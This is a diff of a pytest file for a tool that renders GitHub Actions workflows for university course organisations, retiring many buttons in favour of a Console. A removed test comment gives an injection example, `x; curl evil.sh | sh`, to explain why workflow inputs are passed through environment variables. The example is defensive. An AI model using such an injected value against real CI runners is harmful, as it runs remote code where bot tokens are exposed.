@@ -12,6 +12,7 @@ import re
 import shutil
 import signal
 import subprocess
+import sys
 from pathlib import Path
 
 import pytest
@@ -23,71 +24,27 @@ from dsl_course import (
     mailer,
     profile_readme,
     seed,
-    settings,
     welcome,
     workflows_place,
     workflows_render,
 )
+from dsl_course.ops.registry import REGISTRY, Request
 
 ROOT = Path(__file__).resolve().parents[1]
-
-# GitHub's hard cap on workflow_dispatch inputs - both Release materials variants must
-# stay under it (they spend 5 of the 10, with nothing render-time-variable left to grow).
-GITHUB_MAX_DISPATCH_INPUTS = 10
-
-# The five inputs of a Release materials button, in the order they must appear: exactly a
-# schedule.yml `deploy:` entry's fields, plus the semester org - ordered source-then-target
-# (what to copy, then where it lands) and numbered 1-5 in their descriptions to match.
-RELEASE_INPUTS = [
-    "course_source_repo",
-    "course_source_path",
-    "semester_org",
-    "semester_dest_repo",
-    "semester_dest_path",
-]
 
 # Every workflow renderer, rendered -> a "it parses, and it's gated" sweep. Completeness
 # is enforced by test_every_renderer_is_covered_by_the_yaml_sweep below, so a new button
 # cannot ship without passing through yaml.safe_load.
 ALL_RENDERED = {
-    "release": workflows_render.render_release(
-        ["Semester-f2026"], "course-materials-f2026"
-    ),
-    "central_release": workflows_render.render_central_release(
-        ["course-materials-f2026"], ["Semester-f2026"]
-    ),
-    "provision": workflows_render.render_provision(
-        ["Semester-f2026"], ["assignment-1-f2026"]
-    ),
     "collect_submissions": workflows_render.render_collect_submissions(
         ["Semester-f2026"], ["assignment-1-f2026"]
     ),
-    "sync_membership": workflows_render.render_sync_membership(["Semester-f2026"]),
+    "sync_membership": workflows_render.render_sync_membership(),
     "send_codes": workflows_render.render_send_codes(),
     "distribute_grades": workflows_render.render_distribute_grades(["Semester-f2026"]),
-    "open_team_formation": workflows_render.render_open_team_formation(
-        ["Semester-f2026"]
-    ),
-    "propagate_semester": workflows_render.render_propagate_semester(
-        ["Semester-f2026"]
-    ),
-    "archive_semester": workflows_render.render_archive_semester(["Semester-f2026"]),
-    "bootstrap_semester": workflows_render.render_bootstrap_semester(),
     "refresh": workflows_render.render_refresh(),
-    "generate_syllabus": workflows_render.render_generate_syllabus(
-        ["course-materials-f2026"], ["Semester-f2026"]
-    ),
-    "new_materials": workflows_render.render_new_materials(["course-materials-f2026"]),
-    "new_assignment": workflows_render.render_new_assignment(),
-    "derive_student_version": workflows_render.render_derive_student_version(
-        ["assignment-1-f2026"]
-    ),
-    "patch_assignment": workflows_render.render_patch_assignment(
-        ["Semester-f2026"], ["assignment-1-f2026"]
-    ),
-    "sync_site": workflows_render.render_sync_site(["Semester-f2026"]),
+    "sync_site": workflows_render.render_sync_site(),
     "publish_site": workflows_render.render_publish_site(),
-    "status": workflows_render.render_status(["Semester-f2026"]),
     "scheduler": workflows_render.render_scheduler(),
     "console": workflows_render.render_console(),
 }
@@ -133,30 +90,20 @@ GIT_READ_ONLY = ("--list-semesters", "--check-course-config")
 
 # Every renderer whose run ends in `seed refresh` - and the subset that may join a shared
 # concurrency group. See test_only_the_nightly_refresh_joins_the_seed_refresh_group.
-SEED_REFRESH = {"refresh", "new_materials", "new_assignment", "bootstrap_semester"}
+# The Console's New materials / New assignment / New semester end in one too, in process
+# (`console.execute`), so it never appears in their workflow text.
+SEED_REFRESH = {"refresh"}
 SEED_REFRESH_GROUPED = {"refresh"}
 
 # Job time budgets, per workflow, where they differ from the ordinary 30 minutes. A
 # timeout that fires on a HEALTHY run is an outage, not a safety net: grading budgets 300s
-# per submission subprocess and walks a semester serially, and Bootstrap semester configures a
-# whole org before converging it.
+# per submission subprocess and walks a semester serially.
 DEFAULT_TIMEOUT = 30
 CHECK_TEAM_TIMEOUT = 5
 # Distribute grades walks every submission repo and every gradebook in the semester, so
 # it is bounded like the other grading jobs rather than by the 30-minute default.
 JOB_TIMEOUTS = {
     "distribute_grades": 120,
-    "bootstrap_semester": 60,
-    # Archive semester freezes every repo in a semester org, in series - the same "many
-    # repos, one at a time" shape as a handout - and propagates first, which clones every
-    # source repo the semester has been released from.
-    "archive_semester": 60,
-    # Propagate semester edits clones every semester dest and every course source the plan
-    # names, then pushes and opens a pull request per source.
-    "propagate_semester": 60,
-    # Patch released assignment reads and commits into every submission repo of one
-    # assignment, in series - the same shape as a handout.
-    "patch_assignment": 60,
     # The Console runs any op, the grading ones included, in its one job.
     "console": 120,
 }
@@ -180,26 +127,10 @@ SEMESTERS_2 = ["Semester-f2025", "Semester-f2026"]
 REPOS_2 = ["course-materials-f2025", "course-materials-f2026"]
 ASSIGNMENTS_2 = ["assignment-1-f2025", "assignment-1-f2026"]
 DATED_RENDERED = {
-    "release": workflows_render.render_release(SEMESTERS_2, "course-materials-f2026"),
-    "central_release": workflows_render.render_central_release(REPOS_2, SEMESTERS_2),
-    "provision": workflows_render.render_provision(SEMESTERS_2, ASSIGNMENTS_2),
     "collect_submissions": workflows_render.render_collect_submissions(
         SEMESTERS_2, ASSIGNMENTS_2
     ),
-    "derive_student_version": workflows_render.render_derive_student_version(
-        ASSIGNMENTS_2
-    ),
-    "patch_assignment": workflows_render.render_patch_assignment(
-        SEMESTERS_2, ASSIGNMENTS_2
-    ),
-    "sync_membership": workflows_render.render_sync_membership(SEMESTERS_2),
     "distribute_grades": workflows_render.render_distribute_grades(SEMESTERS_2),
-    "open_team_formation": workflows_render.render_open_team_formation(SEMESTERS_2),
-    "propagate_semester": workflows_render.render_propagate_semester(SEMESTERS_2),
-    "archive_semester": workflows_render.render_archive_semester(SEMESTERS_2),
-    "sync_site": workflows_render.render_sync_site(SEMESTERS_2),
-    "publish_site": workflows_render.render_publish_site(),
-    "status": workflows_render.render_status(SEMESTERS_2),
 }
 
 
@@ -224,10 +155,6 @@ def test_every_org_repo_dropdown_pre_selects_the_newest(name):
         if not any("2026" in o for o in options):
             continue  # a fixed vocabulary (reading-list / individual / group / ...)
         default = spec.get("default")
-        # Sync enrolment's semester_org is the one exception: it stays pinned to the
-        # faculty-only sentinel, because touching a semester must be opted into.
-        if default == workflows_render._FACULTY_ONLY:
-            continue
         assert default in options, f"{name}.{field} default must be one of its options"
         assert "2026" in default, f"{name}.{field} pre-selects {default}, not f2026"
 
@@ -246,16 +173,6 @@ def test_every_renderer_is_covered_by_the_yaml_sweep():
 def test_publish_site_takes_no_inputs():
     # opencourse.yml says what to publish (decision 0016), so the button asks nothing.
     assert workflow_inputs(workflows_render.render_publish_site()) == {}
-
-
-def test_the_release_and_syllabus_dropdowns_default_to_the_newest_materials_repo():
-    repos = ["course-materials-f2026", "lecture-code-f2026"]
-    for rendered in (
-        workflows_render.render_central_release(repos, SEMESTERS_2, repos[:1]),
-        workflows_render.render_generate_syllabus(repos, SEMESTERS_2, repos[:1]),
-    ):
-        inp = workflow_inputs(rendered)["course_source_repo"]
-        assert inp["default"] == "course-materials-f2026"
 
 
 def test_publish_site_has_publish_job_running_public_sync():
@@ -303,42 +220,6 @@ def test_refresh_re_seeds_itself_nightly_without_a_gate():
     assert "needs" not in workflow_jobs(rendered)["refresh"]
 
 
-RELEASE_ASSIGNMENT_INPUTS = [
-    "course_source_repo",
-    "semester_org",
-    "solution_datetime",
-    "preview",
-]
-
-
-def test_the_hand_out_button_asks_what_where_and_two_switches():
-    # Four boxes, numbered in the order they are answered: GitHub renders them as a flat
-    # list and numbers nothing itself, so the numbering in the descriptions is the only
-    # grouping there is - and it must match the order the boxes are rendered in.
-    inp = workflow_inputs(
-        workflows_render.render_provision(SEMESTERS_2, ASSIGNMENTS_2, ASSIGNMENTS_2[0])
-    )
-    assert list(inp) == RELEASE_ASSIGNMENT_INPUTS
-    for n, name in enumerate(RELEASE_ASSIGNMENT_INPUTS, start=1):
-        assert inp[name]["description"].startswith(f"{n}. ")
-    # The template it is seeded into is still the one it opens on.
-    assert inp["course_source_repo"]["default"] == ASSIGNMENTS_2[0]
-    assert inp["solution_datetime"]["default"] == ""
-    assert course.SOLUTION_WARNING in inp["solution_datetime"]["description"]
-    assert inp["preview"]["default"] is True
-
-
-def test_the_hand_out_button_asks_nothing_about_the_assignments_shape():
-    # individual-or-group was a box, and a dispatch could hand out a shape the template
-    # had not declared - one repo per student for an assignment whose teams, sheet and
-    # Join-team form were all keyed per team. The declaration is the only route now.
-    rendered = workflows_render.render_provision(
-        ["Semester-f2026"], ["assignment-4-project-f2026"]
-    )
-    assert "type" not in workflow_inputs(rendered)
-    assert "--type" not in rendered
-
-
 def test_collect_submissions_refreshes_the_sheet_and_freezes_nothing():
     # The button is the on-demand half of the quarter-hourly refresh; the FREEZE belongs to
     # the cron, at the assignment's grading deadline. A button that could freeze early
@@ -354,99 +235,24 @@ def test_collect_submissions_refreshes_the_sheet_and_freezes_nothing():
 
 
 def test_no_button_asks_which_of_two_schedule_entries():
-    # The schedule knows which entry is which (decision 0009): Collect and Patch take the
+    # The schedule knows which entry is which (decision 0009): Collect takes the
     # template, and a template two entries share is refused by the run, naming them.
-    for rendered in (
-        workflows_render.render_collect_submissions(["Semester-f2026"], ["a-f2026"]),
-        workflows_render.render_patch_assignment(["Semester-f2026"], ["a-f2026"]),
-    ):
-        assert "slug" not in workflow_inputs(rendered)
-        assert "--slug" not in rendered
-
-
-def test_the_hand_out_button_never_picks_between_two_schedule_entries():
-    # It was a box, and one press of it decided which half of a semester got repos. The
-    # schedule fires each entry on its own datetime and knows which is which, so an
-    # ambiguous template is refused by the run instead.
-    rendered = workflows_render.render_provision(
-        ["Semester-f2026"], ["assignment-1-f2026"]
+    rendered = workflows_render.render_collect_submissions(
+        ["Semester-f2026"], ["a-f2026"]
     )
     assert "slug" not in workflow_inputs(rendered)
     assert "--slug" not in rendered
 
 
-def test_archive_semester_previews_by_default_and_never_deletes():
-    # The end-of-term button. It is the one WRITE in the set that a second click cannot
-    # take back, so it fails closed like Distribute grades: only an explicit `false`
-    # reaches the CLI as --no-preview, and `force` is the separate, deliberate override of
-    # the term-not-over refusal.
-    rendered = workflows_render.render_archive_semester(["Semester-f2026"])
-    inp = workflow_inputs(rendered)
-    assert set(inp) == {"semester_org", "preview", "force"}
-    assert inp["preview"]["default"] is True
-    assert inp["force"]["default"] is False
-    assert workflows_render._PREVIEW_GATE in rendered
-    assert "python3 -m dsl_course.archive" in rendered
-    # Faculty read the header before they click a button whose name sounds final: it has
-    # to say there, in the file, that this freezes and never destroys.
-    assert "NOTHING IS DELETED" in rendered
-
-
-def test_propagate_semester_previews_by_default():
-    # It force-pushes a branch and opens pull requests in the course org, so it fails
-    # closed like the other cross-org buttons: only an explicit `false` reaches the CLI
-    # as --no-preview. The course org is the repo this runs in.
-    rendered = workflows_render.render_propagate_semester(["Semester-f2026"])
-    inp = workflow_inputs(rendered)
-    assert set(inp) == {"semester_org", "preview"}
-    assert inp["preview"]["default"] is True
-    assert workflows_render._PREVIEW_GATE in rendered
-    assert "python3 -m dsl_course.propagate" in rendered
-    assert "COURSE_ORG: ${{ github.repository_owner }}" in rendered
-    # Faculty read the header before they press it: it has to say there that a deletion
-    # made in the semester is not carried back.
-    assert "DELETIONS ARE NOT PROPAGATED" in rendered
-
-
-def test_open_team_formation_asks_for_a_semester_a_free_text_key_and_previews():
-    # The assignment box is FREE TEXT on purpose. Every other per-assignment button names
-    # a course-org template repo, which this org can discover; a team-formation window is
-    # keyed on a SCHEDULE key out of each semester's own private schedule.yml, so a dropdown
-    # rendered once for the whole course org would offer one semester's keys to another.
-    rendered = workflows_render.render_open_team_formation(["Semester-f2026"])
-    inp = workflow_inputs(rendered)
-    assert list(inp) == ["semester_org", "assignment", "preview"]
-    assert "options" not in inp["assignment"]
-    assert inp["assignment"]["required"] is False
-    assert inp["assignment"]["default"] == ""
-    # It mails a whole semester, so it fails closed like Distribute grades: only an explicit
-    # `false` reaches the CLI as --no-preview.
-    assert inp["preview"]["default"] is True
-    assert workflows_render._PREVIEW_GATE in rendered
-    assert 'args+=(--assignment "$ASSIGNMENT")' in rendered
-    assert "python3 -m dsl_course.team_formation" in rendered
-
-
-def test_the_press_says_in_the_file_what_a_second_press_will_do():
-    # Faculty read this header before pressing a button that emails a semester, and the two
-    # questions they will have are "what happens if I press it twice" and "why did nothing
-    # go out at 23:30". Both are answered where they are asked, not in docs/09 alone.
-    rendered = workflows_render.render_open_team_formation(["Semester-f2026"])
-    assert "mailed.csv" in rendered, "the header has to name what makes a re-press safe"
-    assert "23:00-07:00" in rendered
-
-
 def test_sync_membership_is_a_consolidated_reconcile():
     # One consolidated, fully-automatic reconcile (roster + teams + faculty) - no
     # --prune toggle at this level, config is always the live truth.
-    rendered = workflows_render.render_sync_membership(["Semester-f2026"])
-    inp = workflow_inputs(rendered)
-    assert set(inp) == {"semester_org"}
-    assert inp["semester_org"]["default"] == workflows_render._FACULTY_ONLY
-    assert inp["semester_org"]["options"] == [
-        workflows_render._FACULTY_ONLY,
-        "Semester-f2026",
-    ]
+    rendered = workflows_render.render_sync_membership()
+    # No dropdown (decision 0041): a manual run walks every semester, as the cron does.
+    assert workflow_inputs(rendered) == {}
+    steps = workflow_jobs(rendered)["sync-dispatch"]["steps"]
+    run = next(s for s in steps if s.get("name") == "Sync membership")["run"]
+    assert "--all-semesters" in run
     assert "dsl_course.sync_membership" in rendered
     assert "--prune" not in rendered
     jobs = workflow_jobs(rendered)
@@ -494,217 +300,37 @@ def test_dotgithub_readme_orients_faculty():
     assert "/.github/actions" not in semester
 
 
-@pytest.mark.parametrize(
-    "rendered",
-    [
-        workflows_render.render_release(
-            ["Semester-f2025", "Semester-f2026"], "course-materials-f2026"
-        ),
-        workflows_render.render_central_release(
-            ["course-materials-f2026"], ["Semester-f2025", "Semester-f2026"]
-        ),
-    ],
-    ids=["run-from-repo", "central"],
-)
-def test_both_release_buttons_take_exactly_a_deploy_entrys_fields(rendered):
-    # The whole point of the merged button: its inputs ARE a schedule.yml `deploy:`
-    # entry (plus the semester org), same names, same order, on BOTH variants - so what
-    # faculty learn on the button reads straight across into the schedule.
-    inp = workflow_inputs(rendered)
-    assert list(inp) == RELEASE_INPUTS
-    assert len(inp) <= GITHUB_MAX_DISPATCH_INPUTS
-    assert inp["semester_org"]["required"] is True
-    assert inp["course_source_repo"]["required"] is True
-    assert inp["course_source_path"]["required"] is True
-    # The destination repo carries the SAME default an omitted `semester_dest_repo:` takes in
-    # schedule.yml, so the button and the plan cannot disagree about where a release lands.
-    # Pre-filled rather than required-and-blank: `materials` is what the system supplies
-    # either way, so showing it teaches the default, and it spares faculty hand-typing the
-    # word on every release (which was the typo risk the blank box was meant to prevent).
-    assert inp["semester_dest_repo"]["default"] == "materials"
-    assert inp["semester_dest_repo"]["required"] is True
-    # semester_dest_path is the one optional box, and ships EMPTY - a `default:` on a
-    # free-text field is submitted verbatim, so pre-filling puts words in the faculty
-    # member's mouth. Its fallback is stated on the box instead, or it is invisible.
-    assert inp["semester_dest_path"]["required"] is False
-    assert "default" not in inp["semester_dest_path"]
-    assert "blank mirrors box 2" in inp["semester_dest_path"]["description"]
-    # Labels are plain English: the schedule.yml mapping lives in the input NAMES (asserted
-    # above), so no description repeats its own key back at the reader.
-    for name in RELEASE_INPUTS:
-        assert name not in inp[name]["description"]
-    # Multi-path is discoverable from the button itself, not just the docs.
-    assert "comma-separated" in inp["course_source_path"]["description"]
-    # Every box is numbered in the order it is filled in - GitHub renders dispatch inputs
-    # as a flat list with no grouping, so the sequence has to be in the labels.
-    for n, name in enumerate(RELEASE_INPUTS, start=1):
-        assert inp[name]["description"].startswith(f"{n}. ")
-    # The semester dropdown pre-selects the latest semester, not the alphabetically first.
-    assert inp["semester_org"]["default"] == "Semester-f2026"
-    # Gone with the section machinery: no per-section checkboxes, no session list, no
-    # root-files toggle, no semester_repo dropdown.
-    for retired in (
-        "sessions",
-        "include_root_files",
-        "semester_repo",
-        "release_lectures",
-    ):
-        assert retired not in inp
-
-
-@pytest.mark.parametrize(
-    "rendered",
-    [
-        workflows_render.render_release(["Semester-f2026"], "course-materials-f2026"),
-        workflows_render.render_central_release(
-            ["course-materials-f2026"], ["Semester-f2026"]
-        ),
-    ],
-    ids=["run-from-repo", "central"],
-)
-def test_both_release_buttons_run_the_same_executor_through_env(rendered):
-    # One executor for the schedule and the button (deploy.deploy_many, reached
-    # via its CLI), and every user-supplied input reaches the shell as an env var.
-    step = workflow_jobs(rendered)["release"]["steps"][-1]
-    assert "${{" not in step["run"]
-    assert step["env"]["COURSE_SOURCE_REPO"] == "${{ inputs.course_source_repo }}"
-    assert step["env"]["COURSE_SOURCE_PATH"] == "${{ inputs.course_source_path }}"
-    assert step["env"]["SEMESTER_DEST_REPO"] == "${{ inputs.semester_dest_repo }}"
-    assert step["env"]["SEMESTER_DEST_PATH"] == "${{ inputs.semester_dest_path }}"
-    assert "python3 -m dsl_course.deploy" in step["run"]
-    for flag in (
-        "--course-source-path",
-        "--semester-dest-repo",
-        "--semester-dest-path",
-    ):
-        assert flag in step["run"]
-
-
-def test_run_from_repo_button_prefills_course_source_repo_with_its_own_repo():
-    # Inside a content repo the source is almost always that repo, so it is pre-filled -
-    # but as free text, not a fixed expression, so another repo in the org can be typed in.
-    inp = workflow_inputs(
-        workflows_render.render_release(["Semester-f2026"], "course-materials-f2026")
-    )
-    assert inp["course_source_repo"]["default"] == "course-materials-f2026"
-    assert "type" not in inp["course_source_repo"]  # a string field, not a choice
-
-
-def test_central_button_offers_the_orgs_content_repos_as_the_source_dropdown():
-    # Centrally there is no "own" repo to pre-fill, so course_source_repo is the discovered
-    # dropdown (refreshed by Refresh actions), listed alphabetically but pre-selected on
-    # the latest term year - the repo faculty are teaching from now.
-    inp = workflow_inputs(
-        workflows_render.render_central_release(
-            ["course-materials-f2025", "course-materials-f2026", "lecture-code"],
-            ["Semester-f2026"],
-        )
-    )
-    assert inp["course_source_repo"]["type"] == "choice"
-    assert inp["course_source_repo"]["options"] == [
-        "course-materials-f2025",
-        "course-materials-f2026",
-        "lecture-code",
-    ]
-    assert inp["course_source_repo"]["default"] == "course-materials-f2026"
-
-
-def test_undated_dropdown_options_leave_the_default_to_github():
-    # A course org whose repos carry no term year has no "latest" to pre-select; emitting
-    # a `default:` that is not one of the options would break the workflow outright, so
-    # the dropdown ships bare and GitHub selects the first option.
-    inp = workflow_inputs(
-        workflows_render.render_central_release(
-            ["lecture-code", "slides"], ["Semester-A"]
-        )
-    )
-    assert "default" not in inp["course_source_repo"]
-    assert "default" not in inp["semester_org"]
-    # An org code that merely ends in four digits is not a year (GRAD-E1234 != 1234 AD).
-    inp = workflow_inputs(
-        workflows_render.render_central_release(["mat-e1234"], ["Semester-e1234"])
-    )
-    assert "default" not in inp["semester_org"]
-
-
-def test_content_repos_get_both_buttons_and_lose_the_retired_one(monkeypatch):
-    # Refresh actions re-renders every run-from-repo workflow (so a fix reaches live
-    # courses) - and removes a retired one. All of it in ONE commit: the buttons always
-    # change together, and a burst of near-identical commits is noise in a repo faculty read.
+def test_content_repos_and_templates_lose_both_retired_release_buttons(monkeypatch):
+    # Decision 0041: releasing and handing out are Console ops, so no content repo or
+    # template hosts a workflow. Refresh (and every scaffold) deletes the two retired
+    # ones in ONE commit and writes nothing else.
     commits = []
-    retired = (".github/workflows/release-code.yml",)
-    monkeypatch.setattr(workflows_place, "RETIRED_WORKFLOWS", retired)
 
     def fake_put_files(org, repo, files, message, *, delete=()):
-        commits.append((files, list(delete), message))
+        commits.append((files, list(delete)))
         return True
 
     monkeypatch.setattr(workflows_place, "put_files", fake_put_files)
-    assert (
-        workflows_place.push_content_workflows(
-            "Course",
-            "course-materials-f2026",
-            ["Semester-f2026"],
-            ["assignment-1-f2026"],
-            "release",
-            workflows=workflows_place.RELEASE_WORKFLOWS,
+    for hosted in (
+        workflows_place.RELEASE_WORKFLOWS,
+        workflows_place.TEMPLATE_WORKFLOWS,
+    ):
+        assert hosted == ()
+        assert (
+            workflows_place.push_content_workflows(
+                "Course", "repo", ["Semester-f2026"], [], "release", workflows=hosted
+            )
+            == 0
         )
-        == 0
-    )
-    assert len(commits) == 1
-    files, deleted, _ = commits[0]
-    pushed = {path: content.decode() for path, content in files.items()}
-    assert (
-        set(pushed)
-        == set(workflows_place.RELEASE_WORKFLOWS)
-        == {
-            ".github/workflows/release-materials.yml",
-            ".github/workflows/release-assignment.yml",
-        }
-    )
-    assert deleted == list(retired)
-    # The materials button seeded into a content repo is that repo's own variant.
-    materials = yaml.safe_load(pushed[".github/workflows/release-materials.yml"])
-    trigger = materials.get("on", materials.get(True))
-    inputs = trigger["workflow_dispatch"]["inputs"]
-    assert list(inputs) == RELEASE_INPUTS
-    assert inputs["course_source_repo"]["default"] == "course-materials-f2026"
-
-
-def test_an_assignment_template_hosts_only_the_hand_out_button(monkeypatch):
-    # Release materials from a template would name a source holding no session folders,
-    # so a template hosts Release assignment alone - and it opens on ITSELF, the way the
-    # materials button in a content repo pre-fills that repo's own name.
-    commits = []
-    monkeypatch.setattr(
-        workflows_place,
-        "put_files",
-        lambda org, repo, files, message, **k: commits.append(files) or True,
-    )
-    assert (
-        workflows_place.push_content_workflows(
-            "Course",
-            # NOT the one `_newest` would pre-select out of these two, or the assertion
-            # below would hold just as well with the pre-selection taken out again.
-            "assignment-1-f2026",
-            ["Semester-f2026"],
-            ["assignment-1-f2026", "assignment-2-f2026"],
-            "release",
-            workflows=workflows_place.TEMPLATE_WORKFLOWS,
-        )
-        == 0
-    )
-    assert len(commits) == 1
-    pushed = {path: content.decode() for path, content in commits[0].items()}
-    assert set(pushed) == {".github/workflows/release-assignment.yml"}
-    inputs = workflow_inputs(pushed[".github/workflows/release-assignment.yml"])
-    assert inputs["course_source_repo"]["default"] == "assignment-1-f2026"
-    # ...and a repo that names no template of its own still gets the newest-term pick.
-    other = workflows_render.render_provision(
-        ["Semester-f2026"], ["assignment-1-f2026", "assignment-2-f2026"]
-    )
-    assert workflow_inputs(other)["course_source_repo"]["default"] == (
-        "assignment-2-f2026"
+    assert commits == [({}, list(workflows_place.RETIRED_WORKFLOWS))] * 2
+    assert set(workflows_place.RETIRED_WORKFLOWS) == {
+        ".github/workflows/release-materials.yml",
+        ".github/workflows/release-assignment.yml",
+    }
+    # A course template not yet refreshed still carries one: it is stripped off the
+    # semester copy before students' repos generate from it.
+    assert set(workflows_place.RETIRED_WORKFLOWS) <= set(
+        workflows_place.NEVER_IN_STUDENT_REPOS
     )
 
 
@@ -737,44 +363,26 @@ def test_the_org_level_buttons_land_as_one_commit(monkeypatch):
     assert len(commits) == 1
     repo, files, deleted = commits[0]
     assert repo == ".github"
-    assert (
-        len(files) == 21
-    )  # three grading buttons became two, the two end-of-term ones, the team nudge, Console
+    # Decision 0041: the Console, the crons, and the two grading workflows the Console
+    # dispatches.
+    assert len(files) == 9
     assert ".github/workflows/console.yml" in files
     assert all(path.startswith(".github/workflows/") for path in files)
     assert deleted == list(retired)
     assert retired[0] not in files
-    assert ".github/workflows/check-semester-setup.yml" in files
-    assert ".github/workflows/archive-semester.yml" in files
 
 
-def test_scaffold_buttons_route_inputs_through_env_not_the_shell():
-    # GitHub substitutes ${{ inputs.x }} BEFORE the shell parses the run block, so a tag
-    # like `x; curl evil.sh | sh` would execute in a runner holding DSL_BOT_TOKEN. Every
-    # user-supplied input must reach the script as an env var instead.
-    materials, assignment = (
-        workflows_render.render_new_materials(),
-        workflows_render.render_new_assignment(),
-    )
-    for rendered in (materials, assignment):
-        step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
-        assert "${{" not in step["run"]
-    assert '--semester "$SEMESTER"' in materials
-    # `copy_from` is a repo name off a form like any other input, and it reaches the
-    # CLI as an argument only when someone picked a repo: the placeholder first option
-    # is emptied first, so scaffold is handed no --copy-from at all.
-    step = workflow_jobs(materials)["scaffold"]["steps"][-1]
-    assert step["env"]["COPY_FROM"] == "${{ inputs.copy_from }}"
-    assert (
-        f'[ "$COPY_FROM" = "{workflows_render._FRESH_STARTER}" ] && COPY_FROM=""'
-    ) in materials
-    assert '[ -n "$COPY_FROM" ] && args+=(--copy-from "$COPY_FROM")' in materials
-    assert step["env"]["SEMESTER"] == "${{ inputs.semester }}"
-    # The free-text ones are the ones that matter here: a name is prose a person types.
-    assert '--name "$NAME"' in assignment
-    # A template has no number, no semester and no copy (decision 0014).
-    for gone in ("--number", "--semester", "--copy-from"):
-        assert gone not in assignment
+def test_every_retired_org_workflow_is_deleted_and_never_rendered(monkeypatch):
+    # A retired button left on an org is a second way to do one job, and one nobody
+    # maintains: the refresh that stops rendering it is the one that deletes it.
+    monkeypatch.setattr(seed, "discover_semesters", lambda org: ["Semester-f2026"])
+    monkeypatch.setattr(seed, "discover_content_repos", lambda org: ["m"])
+    monkeypatch.setattr(seed, "discover_materials_repos", lambda org: ["m"])
+    monkeypatch.setattr(seed, "discover_assignments", lambda org: ["a-f2026"])
+    files = seed.github_workflow_files("Course", "release")
+    assert not set(seed.RETIRED_GITHUB_WORKFLOWS) & set(files)
+    for name in ("check-semester-setup", "archive-semester", "patch-assignment"):
+        assert f".github/workflows/{name}.yml" in seed.RETIRED_GITHUB_WORKFLOWS
 
 
 def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
@@ -789,15 +397,15 @@ def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
 def test_choice_falls_back_when_empty():
     # An empty dropdown must still be valid YAML (a placeholder option), never blank.
     assert "(none-yet)" in workflows_render._choice([])
-    inp = workflow_inputs(workflows_render.render_generate_syllabus([], [], []))
-    assert inp["course_source_repo"]["options"] == ["(none-yet)"]
+    inp = workflow_inputs(workflows_render.render_collect_submissions([], []))
+    assert inp["semester_org"]["options"] == ["(none-yet)"]
 
 
 def test_sync_site_auto_resyncs_on_sourced_changes():
     # Sync site must auto-fire (no manual click) on the things the site reads: a push to
     # the course dsl-course.yml, a repository_dispatch from a semester's schedule.yml, and a
     # daily cron catch-all. The auto path is ungated (no check-team); manual stays gated.
-    doc = yaml.safe_load(workflows_render.render_sync_site(["Semester-f2026"]))
+    doc = yaml.safe_load(workflows_render.render_sync_site())
     trigger = doc.get("on", doc.get(True))
     assert "dsl-course.yml" in trigger["push"]["paths"]
     assert trigger["repository_dispatch"]["types"] == ["sync-site"]
@@ -810,72 +418,104 @@ def test_sync_site_auto_resyncs_on_sourced_changes():
     assert jobs["sync"]["needs"] == "check-team"
 
 
-def test_semester_config_membership_dispatcher_fires_on_a_schedule_change():
-    # Sync membership also rewrites `assignments.lock.yml`, the mirror the Join-team form
-    # reads. Without schedule.yml here a new assignment woke NOTHING - the form went on
-    # answering off the previous list until the 06:13 cron, and a group project handed out
-    # in between could not have a team formed for it.
-    tmpl = (ROOT / "templates" / "semester-config" / "dispatch-sync.yml").read_text()
-    doc = yaml.safe_load(tmpl)
-    trigger = doc.get("on", doc.get(True))
-    assert sorted(trigger["push"]["paths"]) == [
+# The semester-config dispatcher's paths map (decision 0041): which course-org event each
+# hand-edited file wakes. Sync membership rewrites `assignments.lock.yml` from the
+# schedule, so schedule.yml wakes it; the site reads teams.csv for the teams with room;
+# the scheduler's pre-flight checks every one; codes go out only on a roster push.
+# Grading sheets are deliberately absent everywhere - a grader saves one all day.
+DISPATCH_MAP = {
+    "scheduled-release": {
+        "schedule.yml",
         "assignments.yml",
         "instructors.yml",
-        "schedule.yml",
         "students.csv",
         "teams.csv",
-    ]
-
-
-def test_semester_config_site_dispatcher_fires_on_schedule_people_or_teams_change():
-    # All three feed the site: schedule.yml its dates, instructors.yml its staff cards, and
-    # teams.csv the teams an assignment inside its formation window lists. None of them may
-    # have to wait for the daily cron - least of all teams.csv, which the Join-team workflow
-    # commits to on every join, and which a student then expects to see themselves in.
-    # (instructors.yml and teams.csv also fire dispatch-sync.yml - a different workflow, event
-    # type sync-membership - which is fine.)
-    tmpl = (
-        ROOT / "templates" / "semester-config" / "dispatch-sync-site.yml"
-    ).read_text()
-    doc = yaml.safe_load(tmpl)
-    trigger = doc.get("on", doc.get(True))
-    assert sorted(trigger["push"]["paths"]) == [
-        "assignments.yml",
+    },
+    "sync-membership": {
+        "students.csv",
+        "teams.csv",
         "instructors.yml",
         "schedule.yml",
-        "teams.csv",
-    ]
-    assert "sync-site" in tmpl  # dispatches the sync-site event
+        "assignments.yml",
+    },
+    "sync-site": {"schedule.yml", "assignments.yml", "instructors.yml", "teams.csv"},
+    "send-codes": {"students.csv"},
+}
 
 
-def test_semester_config_scheduler_dispatcher_fires_on_a_schedule_change():
-    # GitHub delivers only a fraction of `schedule:` cron fires, so the promise that a
-    # schedule.yml edit takes effect within minutes holds only if the edit itself starts a
-    # run. The other three are the hand-edited files the same run checks: a push that
-    # leaves one of them unreadable is mailed within the minute rather than at the hour.
-    # Grading sheets are deliberately absent - a grader saves one all day.
-    tmpl = (
-        ROOT / "templates" / "semester-config" / "dispatch-scheduled-release.yml"
-    ).read_text()
-    doc = yaml.safe_load(tmpl)
+def _dispatcher() -> tuple[str, dict]:
+    tmpl = (ROOT / "templates" / "semester-config" / "dispatch.yml").read_text()
+    return tmpl, yaml.safe_load(tmpl)
+
+
+def test_one_semester_config_dispatcher_carries_the_paths_map():
+    tmpl, doc = _dispatcher()
     trigger = doc.get("on", doc.get(True))
     assert set(trigger) == {"push"}
-    assert trigger["push"]["paths"] == [
-        "schedule.yml",
-        "assignments.yml",
-        "instructors.yml",
-        "students.csv",
-        "teams.csv",
-    ]
-    assert not any("grading_sheets" in p for p in trigger["push"]["paths"])
     assert trigger["push"]["branches"] == ["main"]
+    assert set(trigger["push"]["paths"]) == set().union(*DISPATCH_MAP.values())
+    run = doc["jobs"]["dispatch"]["steps"][0]["run"]
+    block = run.split('paths="', 1)[1].split('"', 1)[0]
+    rows = {
+        line.split()[0]: set(line.split()[1:]) for line in block.split("\n") if line
+    }
+    assert rows == DISPATCH_MAP
